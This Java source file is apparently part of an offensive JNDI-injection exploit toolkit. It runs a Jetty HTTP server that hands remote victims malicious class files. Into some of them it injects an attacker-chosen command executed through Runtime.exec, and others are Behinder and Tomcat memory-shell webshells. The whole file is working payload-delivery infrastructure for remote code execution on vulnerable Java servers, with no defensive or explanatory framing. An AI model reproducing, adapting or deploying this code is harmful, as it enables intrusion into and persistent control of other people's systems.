package jetty;

import org.eclipse.jetty.server.Server;
import org.eclipse.jetty.servlet.ServletHandler;
import sun.misc.IOUtils;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;
import java.net.URLEncoder;

import static run.ServerStart.getLocalTime;
import static util.Transformers.insertCommand;

/**
 * @Classname JettyServer
 * @Description HTTPServer supply .class file which execute command by Runtime.getRuntime.exec()
 * @Author welkin
 */
public class JettyServer implements Runnable{
    private int port;
    private Server server;
    private static String command;

    private static String shell;

    private static boolean isMemshell = false;

//    public JettyServer(int port) {
//        this.port = port;
//        server = new Server(port);
//        command = "open /Applications/Calculator.app";
//    }

    public JettyServer(int port,String cmd) {
        this.port = port;
        server = new Server(port);
        command = cmd;
    }

    public JettyServer(int port,String cmd,String shell){
        this.port = port;
        server = new Server(port);
        command = cmd;
        shell = shell;
    }

    @Override
    public void run() {
        ServletHandler handler = new ServletHandler();
        server.setHandler(handler);

        handler.addServletWithMapping(DownloadServlet.class, "/*");
        try {
            server.start();
            server.join();
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    @SuppressWarnings("serial")
    public static class DownloadServlet extends HttpServlet {
        public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{

            String filename = request.getRequestURI().substring(1);
            InputStream in = checkFilename(filename);
            ByteArrayInputStream bain = null;
            //这里其实就得做一个分支了，应该直接返回shell的字节码文件不能再动态生成了
            if(isMemshell){
                try{
                    byte[] bytes = IOUtils.readFully(in, -1, false);
                    bain = new ByteArrayInputStream(bytes);
                }catch (Exception e){
                    e.printStackTrace();
                    System.out.println(getLocalTime() + " [JETTYSERVER]>> Memshell Byte array get failed.");
                }
                System.out.println(getLocalTime() + " [JETTYSERVER]>> Log a request to " + request.getRequestURL());
                response.setStatus(HttpServletResponse.SC_OK);
                response.setHeader("content-disposition", "attachment;filename="+URLEncoder.encode(filename, "UTF-8"));
                int len ;
                byte[] buffer = new byte[1024];
                OutputStream out = response.getOutputStream();
                if (bain != null){
                    while ((len = bain.read(buffer)) > 0) {
                        out.write(buffer,0,len);
                    }
                    bain.close();
                }else {
                    System.out.println(getLocalTime() + " [JETTYSERVER]>> Read file error!");
                }
            }else{
                byte[] transformed;
                if (in != null) {
                    try {
                        transformed = insertCommand(in,command);
                        bain = new ByteArrayInputStream(transformed);

                    }catch (Exception e){
                        e.printStackTrace();
                        System.out.println(getLocalTime() + " [JETTYSERVER]>> Byte array build failed.");
                    }

                    System.out.println(getLocalTime() + " [JETTYSERVER]>> Log a request to " + request.getRequestURL());
                    response.setStatus(HttpServletResponse.SC_OK);
                    response.setHeader("content-disposition", "attachment;filename="+URLEncoder.encode(filename, "UTF-8"));

                    int len ;
                    byte[] buffer = new byte[1024];
                    OutputStream out = response.getOutputStream();
                    if (bain != null){
                        while ((len = bain.read(buffer)) > 0) {
                            out.write(buffer,0,len);
                        }
                        bain.close();
                    }else {
                        System.out.println(getLocalTime() + " [JETTYSERVER]>> Read file error!");
                    }
                }else {
                    System.out.println(getLocalTime() + " [JETTYSERVER]>> URL("+ request.getRequestURL() +") Not Exist!");
                }
            }
        }

        public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException{
            doGet(request, response);
        }
    }

    private static InputStream checkFilename(String filename){
        String template;
        switch (filename){
            case "ExecTemplateJDK7.class":
                template = "template/ExecTemplateJDK7.class";
                break;
            case "ExecTemplateJDK8.class":
                template = "template/ExecTemplateJDK8.class";
                break;
            case "Behinder.class":
                template = "Behinder.class";
                isMemshell = true;
                break;
            case "TomcatShell.class":
                template = "TomcatShell.class";
                isMemshell = true;
                break;
                // TODO:Add more
            default:
                return null;
        }
        return Thread.currentThread().getContextClassLoader().getResourceAsStream(template);

    }

}
